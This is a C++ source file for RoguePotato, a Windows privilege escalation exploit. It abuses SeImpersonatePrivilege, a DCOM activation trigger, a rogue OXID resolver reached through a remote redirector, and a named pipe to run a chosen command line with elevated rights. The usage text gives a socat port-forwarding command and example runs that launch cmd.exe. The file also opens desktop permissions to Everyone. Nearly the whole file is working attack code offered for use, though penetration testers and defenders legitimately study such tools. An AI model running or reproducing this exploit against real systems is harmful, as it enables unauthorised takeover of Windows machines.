#include "Windows.h"
#include "stdio.h"
#include <time.h>
#include "IStorageTrigger.h"
#include "common.h"

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

//global variables
wchar_t* remote_ip;
wchar_t* commandline = NULL;
wchar_t* clsid_string;
char gPipeName[MAX_PATH];
wchar_t WinStationName[256];

//functions
void GenRandomString(char* s, const int len);
DWORD WINAPI ThreadOxid(LPVOID lpParam);
void SetWinDesktopPerms();


int wmain(int argc, wchar_t** argv)
{
	//init default values
	wchar_t default_clsid[] = L"{4991d34b-80a1-4291-83b6-3328366b9097}";
	wchar_t* listening_port = NULL;
	wchar_t* pipe_placeholder = (wchar_t*)PIPE_NAME;
	
	remote_ip = NULL;
	clsid_string = default_clsid;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'r':
			++argv;
			--argc;
			remote_ip = argv[1];
			break;

		case 'e':
			++argv;
			--argc;
			commandline = argv[1];
			break;

		case 'l':
			++argv;
			--argc;
			listening_port = argv[1];
			break;

		case 'c':
			++argv;
			--argc;
			clsid_string = argv[1];
			break;

		case 'p':
			++argv;
			--argc;
			pipe_placeholder = argv[1];
			break;

		case 'z':
			++argv;
			--argc;
			pipe_placeholder = NULL;
			break;

		case 'h':
			Usage();
			exit(100);
			break;

		default:
			wprintf(L"Wrong Argument: %s\n", argv[1]);
			Usage();
			exit(-1);
		}
		++argv;
		--argc;
	}

	if (remote_ip == NULL || commandline == NULL)
	{
		Usage();
		exit(-1);
	}

	
	
	printf("[+] Starting RoguePotato...\n");
	RoguePotato(commandline, pipe_placeholder, listening_port);
	return 0;
}

void RoguePotato(wchar_t *commandline, wchar_t *pipe_placeholder, wchar_t *listening_port) {
	DWORD threadId;
	wchar_t pipename[MAX_PATH];
	if (!EnablePriv(NULL, SE_IMPERSONATE_NAME))
	{
		wprintf(L"[-] A privilege is missing: '%ws'. Exiting ...\n", SE_IMPERSONATE_NAME);
		exit(-1);
	}
	
	SetWinDesktopPerms();

	if (listening_port != NULL) {
		printf("[*] Creating Rogue OXID resolver thread\n");
		CreateThread(NULL, 0, ThreadOxid, (LPVOID)listening_port, 0, &threadId);
	}
	else
		printf("[!] RogueOxidResolver not run locally. Ensure you run it on your remote machine\n");
	
	if(pipe_placeholder == NULL)
		GenRandomString(gPipeName, 10);
	else
		wcstombs(gPipeName, pipe_placeholder, MAX_PATH-1);
	
	wsprintf(pipename, L"\\\\.\\pipe\\%S\\pipe\\epmapper", gPipeName);
	CreatePipeServer(pipename);	
}

void Usage()
{
	printf("\n\n\tRoguePotato\n\t@splinter_code & @decoder_it \n\n\n");

	printf("Mandatory args: \n"
		"-r remote_ip: ip of the remote machine to use as redirector\n"
		"-e commandline: commandline of the program to launch\n"
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-l listening_port: This will run the RogueOxidResolver locally on the specified port\n"
		"-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})\n"
		"-p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato)\n"
		"-z : this flag will randomize the pipename_placeholder (don't use with -p)\n"
	);

	printf("\n\n");
	printf("Examples: \n"
		" - Network redirector / port forwarder to run on your remote machine, must use port 135 as src port\n"
		"\tsocat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999\n"
		" - RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.\n"
		"\tRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\"\n"
		" - RoguePotato all in one with RogueOxidResolver running locally on port 9999\n"
		"\tRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999\n"
		" - RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename\n"
		"\tRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode\n"
	);
}

void TriggerDCOM()
{
	CoInitialize(NULL);

	//Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, TRUE, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(clsid_string, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	if (status == CO_E_BAD_PATH) {
		printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
		exit(-1);
	}
	//debug
	//printf("[*] CoGetInstanceFromIStorage status:0x%x\n", status);
	CoUninitialize();
}

void GenRandomString(char* s, const int len)
{

	srand(time(NULL));
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

DWORD WINAPI ThreadOxid(LPVOID lpParam)
{
	char listening_port[6];
	wcstombs(listening_port, (const wchar_t*)lpParam, MAX_PATH - 1);
	RunRogueOxidResolver(listening_port);
	return 0;
}

void SetWinDesktopPerms()
{
	HWINSTA hwinstaold = GetProcessWindowStation();
	DWORD lengthNeeded;
	memset(WinStationName, 0, sizeof(WinStationName));
	GetUserObjectInformationW(hwinstaold, UOI_NAME, WinStationName, 256, &lengthNeeded);



	HWINSTA hwinsta = OpenWindowStationW(WinStationName, FALSE, READ_CONTROL | WRITE_DAC);

	if (!SetProcessWindowStation(hwinsta))
		printf("[-] Error SetProcessWindowStation:%d\n", GetLastError());

	HDESK hdesk = OpenDesktop(
		L"default",
		0,
		FALSE,
		READ_CONTROL | WRITE_DAC |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS
	);
	if (hdesk == NULL)
		printf("[-] Error open Desktop:%d\n", GetLastError());
	if (!SetProcessWindowStation(hwinstaold))
		printf("[-] Error SetProcessWindowStation2:%d\n", GetLastError());


	PSID psid = BuildEveryoneSid();
	//printf("psid=%0x\n", psid);
	if (!AddTheAceWindowStation(hwinstaold, psid))
		printf("[-] Error add Ace Station:%d\n", GetLastError());
	if (!AddTheAceDesktop(hdesk, psid))
		printf("[-] Error add Ace desktop:%d\n", GetLastError());
	//free(psid);
	CloseWindowStation(hwinsta);

	CloseDesktop(hdesk);
}